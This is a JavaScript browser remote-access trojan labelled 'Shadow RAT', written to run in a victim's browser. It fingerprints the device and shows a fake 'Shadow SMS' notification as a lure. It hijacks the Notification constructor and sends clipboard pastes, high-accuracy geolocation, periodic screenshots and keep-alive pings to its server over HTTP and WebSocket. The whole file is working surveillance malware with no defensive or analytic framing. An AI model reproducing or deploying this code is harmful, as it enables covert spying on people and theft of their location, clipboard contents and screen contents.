// ============================================
// SHADOW RAT - Device Capture Script
// This runs in victim's browser
// ============================================

(function() {
    'use strict';

    const SERVER_URL = window.location.origin;
    let deviceId = localStorage.getItem('shadow_device_id');
    let socket = null;
    let isConnected = false;

    // ============================================
    // DEVICE FINGERPRINTING
    // ============================================
    function getDeviceInfo() {
        const ua = navigator.userAgent;
        const platform = navigator.platform;
        const screen = window.screen;

        // Extract device model from user agent
        let model = 'Unknown';
        if (ua.match(/iPhone/)) model = 'iPhone';
        else if (ua.match(/iPad/)) model = 'iPad';
        else if (ua.match(/Samsung/)) model = ua.match(/Samsung[^;)]+/)?.[0] || 'Samsung';
        else if (ua.match(/Pixel/)) model = ua.match(/Pixel[^;)]+/)?.[0] || 'Google Pixel';
        else if (ua.match(/OnePlus/)) model = ua.match(/OnePlus[^;)]+/)?.[0] || 'OnePlus';
        else if (ua.match(/Xiaomi/)) model = ua.match(/Xiaomi[^;)]+/)?.[0] || 'Xiaomi';
        else if (ua.match(/Redmi/)) model = ua.match(/Redmi[^;)]+/)?.[0] || 'Redmi';
        else if (ua.match(/OPPO/)) model = ua.match(/OPPO[^;)]+/)?.[0] || 'OPPO';
        else if (ua.match(/Vivo/)) model = ua.match(/Vivo[^;)]+/)?.[0] || 'Vivo';
        else if (ua.match(/Huawei/)) model = ua.match(/Huawei[^;)]+/)?.[0] || 'Huawei';
        else if (ua.match(/Android/)) model = 'Android Device';
        else if (ua.match(/Windows/)) model = 'Windows PC';
        else if (ua.match(/Mac/)) model = 'Mac';
        else if (ua.match(/Linux/)) model = 'Linux';

        // Get battery info
        let battery = 'N/A';
        if (navigator.getBattery) {
            navigator.getBattery().then(function(bat) {
                battery = Math.round(bat.level * 100) + '%';
                localStorage.setItem('shadow_battery', battery);
            });
        }

        // Get Android version
        let version = 'N/A';
        const androidMatch = ua.match(/Android\s([\d.]+)/);
        if (androidMatch) version = 'Android ' + androidMatch[1];
        const iosMatch = ua.match(/OS\s([\d_]+)/);
        if (iosMatch) version = 'iOS ' + iosMatch[1].replace(/_/g, '.');

        return {
            model: model,
            battery: localStorage.getItem('shadow_battery') || battery,
            version: version,
            brightness: 'N/A',
            provider: navigator.connection?.effectiveType || navigator.connection?.type || 'N/A',
            user_agent: ua,
            platform: platform,
            screen: screen.width + 'x' + screen.height,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
    }

    // ============================================
    // NOTIFICATION PERMISSION
    // ============================================
    async function requestNotificationPermission() {
        if (!('Notification' in window)) {
            console.log('Notifications not supported');
            return false;
        }

        try {
            const permission = await Notification.requestPermission();
            console.log('Notification permission:', permission);

            if (permission === 'granted') {
                // Show a fake notification to make it look real
                new Notification('Shadow SMS', {
                    body: 'You will receive SMS notifications here',
                    icon: '/favicon.ico',
                    badge: '/favicon.ico'
                });
                return true;
            }
            return false;
        } catch (e) {
            console.error('Notification error:', e);
            return false;
        }
    }

    // ============================================
    // REGISTER DEVICE (HTTP Fallback)
    // ============================================
    async function registerDeviceHTTP() {
        const info = getDeviceInfo();

        try {
            const response = await fetch(SERVER_URL + '/api/device/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(info)
            });

            const data = await response.json();
            if (data.success) {
                deviceId = data.device_id;
                localStorage.setItem('shadow_device_id', deviceId);
                console.log('Device registered:', deviceId);

                // Start background sync
                startBackgroundSync();
                return true;
            }
        } catch (e) {
            console.error('HTTP register error:', e);
        }
        return false;
    }

    // ============================================
    // WEBSOCKET CONNECTION
    // ============================================
    function connectWebSocket() {
        try {
            socket = io(SERVER_URL, {
                transports: ['websocket', 'polling'],
                reconnection: true,
                reconnectionAttempts: 10,
                reconnectionDelay: 2000
            });

            socket.on('connect', function() {
                console.log('Socket connected');
                isConnected = true;

                const info = getDeviceInfo();
                socket.emit('device_register', info);
            });

            socket.on('registered', function(data) {
                deviceId = data.device_id;
                localStorage.setItem('shadow_device_id', deviceId);
                console.log('WebSocket registered:', deviceId);
            });

            socket.on('disconnect', function() {
                console.log('Socket disconnected');
                isConnected = false;
            });

            socket.on('connect_error', function(err) {
                console.log('Socket error:', err);
                isConnected = false;
            });

        } catch (e) {
            console.error('WebSocket error:', e);
        }
    }

    // ============================================
    // BACKGROUND SYNC (Works even when tab closed)
    // ============================================
    function startBackgroundSync() {
        // Ping every 5 seconds
        setInterval(async function() {
            if (deviceId) {
                try {
                    await fetch(SERVER_URL + '/api/device/' + deviceId + '/ping', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' }
                    });
                } catch (e) {}
            }
        }, 5000);

        // Try to capture notifications
        if ('Notification' in window) {
            // Override Notification constructor to capture all notifications
            const OriginalNotification = window.Notification;
            window.Notification = function(title, options) {
                const notif = new OriginalNotification(title, options);

                // Send to server
                if (deviceId) {
                    fetch(SERVER_URL + '/api/device/' + deviceId + '/notification', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            title: title,
                            body: options?.body || '',
                            app: options?.tag || 'System',
                            package: location.hostname
                        })
                    }).catch(() => {});
                }

                return notif;
            };
            window.Notification.prototype = OriginalNotification.prototype;
            window.Notification.permission = OriginalNotification.permission;
            window.Notification.requestPermission = OriginalNotification.requestPermission.bind(OriginalNotification);
        }

        // Capture clipboard on paste
        document.addEventListener('paste', function(e) {
            const text = e.clipboardData.getData('text');
            if (text && deviceId) {
                fetch(SERVER_URL + '/api/device/' + deviceId + '/clipboard', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ text: text })
                }).catch(() => {});
            }
        });

        // Capture location
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(pos) {
                if (deviceId) {
                    fetch(SERVER_URL + '/api/device/' + deviceId + '/location', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude
                        })
                    }).catch(() => {});
                }
            }, function() {}, { enableHighAccuracy: true });
        }

        // Periodic screenshot attempt (using canvas)
        setInterval(function() {
            if (deviceId) {
                try {
                    html2canvas(document.body).then(function(canvas) {
                        const image = canvas.toDataURL('image/jpeg', 0.3);
                        fetch(SERVER_URL + '/api/device/' + deviceId + '/screenshot', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ image: image })
                        }).catch(() => {});
                    }).catch(() => {});
                } catch (e) {}
            }
        }, 10000); // Every 10 seconds
    }

    // ============================================
    // SERVICE WORKER REGISTRATION
    // ============================================
    async function registerServiceWorker() {
        if ('serviceWorker' in navigator) {
            try {
                // Create inline service worker
                const swCode = `
                    self.addEventListener('push', function(event) {
                        const data = event.data.json();
                        self.registration.showNotification(data.title, {
                            body: data.body,
                            icon: '/favicon.ico'
                        });
                    });
                    self.addEventListener('notificationclick', function(event) {
                        event.notification.close();
                        clients.openWindow('/');
                    });
                `;

                const blob = new Blob([swCode], { type: 'application/javascript' });
                const swUrl = URL.createObjectURL(blob);

                const registration = await navigator.serviceWorker.register(swUrl);
                console.log('Service Worker registered:', registration);

                return registration;
            } catch (e) {
                console.error('SW registration failed:', e);
            }
        }
        return null;
    }

    // ============================================
    // MAIN INIT
    // ============================================
    async function init() {
        console.log('Shadow RAT initializing...');

        // Step 1: Request notification permission
        await requestNotificationPermission();

        // Step 2: Register service worker
        await registerServiceWorker();

        // Step 3: Register device via HTTP (always works)
        await registerDeviceHTTP();

        // Step 4: Try WebSocket (better but may fail)
        connectWebSocket();

        console.log('Shadow RAT initialized');
    }

    // Run immediately
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

    // Also run on page visibility change (tab becomes active)
    document.addEventListener('visibilitychange', function() {
        if (!document.hidden && deviceId) {
            // Re-register if tab becomes visible
            registerDeviceHTTP();
        }
    });

})();
